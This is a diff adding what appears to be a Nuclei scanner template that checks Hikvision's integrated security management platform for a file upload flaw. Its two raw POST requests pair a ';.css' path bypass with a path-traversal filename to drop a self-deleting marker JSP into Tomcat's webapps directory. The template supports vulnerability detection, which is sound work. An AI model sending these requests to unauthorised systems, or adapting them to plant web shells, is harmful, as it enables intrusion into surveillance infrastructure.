@@ -1,0 +1,74 @@
+id: hikvision-isecure-center-files-fileupload
+
+info:
+  name: 海康威视综合安防管理平台 /lm/api/files - File Upload
+  author: qwtd
+  severity: high
+  tags: HIKVISION-综合安防管理平台
+  description: |
+    This template checks for file upload vulnerabilities in Hikvision's integrated security management platform via the `/lm/api/files` endpoint.
+
+http:
+  - raw:
+      - |-
+        POST /lm/api/files;.css HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Length: 347
+        SL-CE-SUID: 39
+
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.1/webapps/els/static/{{randstr_2}}.jsp"
+        Content-Type: application/zip
+
+        <% out.println("{{randstr_1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "code\":\"0"
+          - "filename\":"
+          - "link\":"
+          - "id\":"
+        condition: and
+
+  - raw:
+      - |-
+        POST /lm/api/files;.css HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Length: 347
+        SL-CE-SUID: 39
+
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
+        Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.2/webapps/els/static/{{randstr_2}}.jsp"
+        Content-Type: application/zip
+
+        <% out.println("{{randstr_1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "code\":\"0"
+          - "filename\":"
+          - "link\":"
+          - "id\":"
+        condition: and
